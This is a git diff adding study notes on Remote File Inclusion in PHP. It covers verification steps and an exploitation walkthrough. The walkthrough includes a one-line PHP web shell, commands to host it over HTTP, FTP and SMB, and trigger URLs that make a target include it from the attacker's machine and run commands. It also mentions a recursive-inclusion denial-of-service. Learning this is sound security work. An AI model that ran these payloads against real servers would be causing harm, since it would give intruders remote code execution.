@@ -226,3 +226,83 @@ PHP Wrappers extend the functionality of PHP streams, allowing data to be treate
 
 
 ---
+
+
+
+# Remote File Inclusion (RFI)
+
+## Overview
+Remote File Inclusion (RFI) vulnerabilities occur when a web application's functions allow the inclusion of remote files by specifying a remote URL. Exploiting RFI can enable attackers to:
+1. **Enumerate local-only ports and web applications** (by leveraging SSRF techniques).
+2. **Gain remote code execution** by including and executing a malicious script hosted on the attacker's machine.
+
+## Local vs. Remote File Inclusion (LFI vs. RFI)
+- RFI includes **remote files via URLs** (e.g., `http://`), while LFI includes **local files**.
+- **Key Differences**:
+  1. An RFI vulnerability inherently includes LFI functionality since remote file inclusion implies local inclusion.
+  2. An LFI may not allow RFI due to:
+     - Function restrictions (e.g., no remote URL support).
+     - Partial control over file paths (e.g., fixed `http://`).
+     - Server configurations disabling remote file inclusion (e.g., `allow_url_include` disabled by default in PHP).
+
+
+## Verifying RFI Vulnerabilities
+### 1. Check Configuration
+In languages like PHP, RFI depends on server configurations:
+- The `allow_url_include` setting must be enabled:
+  ```bash
+  $ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...' | base64 -d | grep allow_url_include
+  allow_url_include = On
+  ```
+
+### 2. Test Inclusion
+- **Step 1**: Test with a local URL (e.g., `http://127.0.0.1:80/index.php`) to confirm the page allows URL inclusion.
+- **Step 2**: Check if the page executes the included file's content (e.g., runs PHP code instead of displaying it as text).
+
+## Exploiting RFI for Remote Code Execution
+To exploit RFI for code execution, attackers typically:
+1. Create a **malicious script** in the web application's language.
+   - Example: A PHP shell script:
+     ```php
+     <?php system($_GET["cmd"]); ?>
+     ```
+   - This allows execution of system commands by passing them as parameters.
+
+2. **Host the script** to make it accessible remotely:
+   - **HTTP**:
+     Use Python's HTTP server to host the script:
+     ```bash
+     $ sudo python3 -m http.server <LISTENING_PORT>
+     ```
+   - **FTP**:
+     Use Python's FTP server:
+     ```bash
+     $ sudo python -m pyftpdlib -p 21
+     ```
+   - **SMB**:
+     Use Impacket for SMB hosting (ideal for Windows servers):
+     ```bash
+     $ impacket-smbserver -smb2support share $(pwd)
+     ```
+
+3. **Trigger inclusion through the vulnerable web application**:
+   - HTTP Example:
+     ```
+     http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
+     ```
+   - FTP Example:
+     ```
+     http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id
+     ```
+   - SMB Example (Windows UNC Path): SMB doesnt needthe allow_url_include setting to be enabled for RFI exploitation
+     ```
+     http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
+     ```
+
+## Additional Notes
+- **Recursive Inclusion**: Including the vulnerable page itself (e.g., `index.php`) could cause a loop and lead to a Denial of Service (DoS).
+- **Server-side Request Forgery (SSRF)**:
+  - RFI vulnerabilities can double as SSRF vectors, enabling attackers to interact with internal services (e.g., accessing applications on `localhost` or other internal ports).
+- **Default Settings**:
+  - RFI is often disabled in modern configurations for security reasons (e.g., `allow_url_include` set to `Off` by default in PHP).
+  - SMB exploitation may require the attacker to be on the same network if the server restricts remote access.
